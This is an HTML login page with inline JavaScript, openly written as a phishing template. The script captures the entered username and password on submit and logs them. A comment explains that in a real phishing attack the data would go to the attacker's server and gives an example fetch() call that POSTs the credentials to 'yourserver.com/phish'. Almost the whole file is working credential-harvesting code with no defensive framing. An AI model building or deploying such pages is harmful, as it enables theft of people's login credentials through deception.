<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .login-form { width: 300px; margin: 0 auto; }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>Login</h2>
        <form id="loginForm">
            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username" required><br><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" required><br><br>
            <input type="submit" value="Login">
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // Simulate sending data to a server
            console.log('Username:', username);
            console.log('Password:', password);

            // In a real phishing attack, you would send this data to your server
            // Example: fetch('https://yourserver.com/phish', { method: 'POST', body: JSON.stringify({ username: username, password: password }) })
        });
    </script>
</body>
</html>
